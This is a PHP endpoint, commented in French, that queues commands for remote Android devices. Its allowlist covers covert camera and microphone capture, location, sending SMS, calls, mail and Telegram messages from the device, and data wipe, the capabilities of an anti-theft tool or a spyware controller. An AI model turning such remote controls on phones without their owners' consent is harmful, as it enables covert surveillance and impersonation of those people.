<?php
declare(strict_types=1);
require_once __DIR__ . '/auth_middleware.php';
require_once __DIR__ . '/db.php';

require_auth_json();
require_method('POST');

// CSRF check
$token = $_POST['csrf_token'] ?? ($_SERVER['HTTP_X_CSRF_TOKEN'] ?? '');
if (!verify_csrf($token)) {
    json_error('Invalid CSRF token', 403);
}

$id = filter_input(INPUT_POST, 'id', FILTER_VALIDATE_INT);

// ══════════════════════════════════════════════════════════════════
//  [FIX CRITIQUE] Limite relevée à 500 chars pour les payloads
//  Les commandes comme TEXT2SPEACH:long texte, INJECT_SMS:num>msg
//  étaient tronquées à 50 chars et devenaient invalides
// ══════════════════════════════════════════════════════════════════
$rawCommand = trim($_POST['command'] ?? '');

// Sécurité : limite raisonnable
if (mb_strlen($rawCommand) > 500) {
    $rawCommand = mb_substr($rawCommand, 0, 500);
}

if (!$id || $id < 1 || $rawCommand === '') {
    json_error('Invalid parameters');
}

// ══════════════════════════════════════════════════════════════════
//  [FIX CRITIQUE] Extraire le NOM de la commande (avant le ":")
//  pour valider dans l'allowlist, tout en gardant la payload
//  complète (nom:arguments) pour l'écriture en base
//
//  Avant : "TEXT2SPEACH:Bonjour" → rejeté car pas dans la liste
//  Après : "TEXT2SPEACH:Bonjour" → base = "TEXT2SPEACH" → OK
// ══════════════════════════════════════════════════════════════════
$colonPos = strpos($rawCommand, ':');
$commandBase = ($colonPos !== false) ? substr($rawCommand, 0, $colonPos) : $rawCommand;
$commandBase = strtoupper(trim($commandBase));

// Allowlist complète de toutes les commandes supportées
$allowed = [
    // Hardware triggers
    'FLASH', 'NOFLASH',
    'VIBRATE', 'STOPVIBRATE',
    'STROBO', 'NOSTROBO',
    'RING', 'STOPRING',

    // Camera / streaming
    'STREAMBACK', 'STREAMFRONT', 'STOPSTREAM',
    'LIVE', 'STOPLIVE',
    'RECORDVIDEOFRONT', 'RECORDVIDEOBACK',
    'PICTUREFRONT', 'PICTUREBACK',

    // Audio / TTS / Morse
    'MICRO', 'STOPMICRO',
    'TEXT2SPEACH',       // TEXT2SPEACH:texte
    'PLAYAUDIO',         // PLAYAUDIO:fichier.mp3
    'MORSE',             // MORSE:SOS

    // Écran / Glow
    'FULL_GLOW',         // FULL_GLOW:#hexcolor

    // Traps & sensors
    'STROBO_COMBO_ON', 'STROBO_COMBO_OFF',
    'MOTION_TRAP_ON', 'MOTION_TRAP_OFF',
    'PROXIMITY_ON', 'PROXIMITY_OFF',

    // Comms injection
    'INJECT_CALL',       // INJECT_CALL:numero>corps
    'INJECT_SMS',        // INJECT_SMS:numero>message
    'INJECT_MAIL',       // INJECT_MAIL:email>corps
    'INJECT_TELEGRAM',   // INJECT_TELEGRAM:chatId>message

    // Localisation
    'LOCALISATION',

    // Sécurité
    'SCREEN_LOCK',
    'WIPE_DATA',
    'WIFI_SCAN',

    // Sound detect (legacy)
    'SOUND DETECT',

    // Neutre
    'NONE',
];

if (!in_array($commandBase, $allowed, true)) {
    json_error('Unknown command: ' . $commandBase);
}

try {
    $pdo  = Database::get();

    // ══════════════════════════════════════════════════════════
    //  On écrit la commande COMPLÈTE avec arguments en base
    //  L'app Android parse le ":" pour séparer nom et payload
    // ══════════════════════════════════════════════════════════
    $stmt = $pdo->prepare('UPDATE Devices SET Command = ? WHERE Id = ?');
    $stmt->execute([$rawCommand, $id]);

    if ($stmt->rowCount() === 0) {
        json_error('Device not found', 404);
    }

    // Log la commande
    $pdo->prepare(
        'INSERT INTO CommandLog (DeviceId, Command, UserId) VALUES (?, ?, ?)'
    )->execute([$id, $rawCommand, $_SESSION['user_id'] ?? 0]);

    json_response(['success' => true, 'command' => $rawCommand, 'device' => $id]);
} catch (PDOException $e) {
    error_log('update_command.php: ' . $e->getMessage());
    json_error('Database error', 500);
}
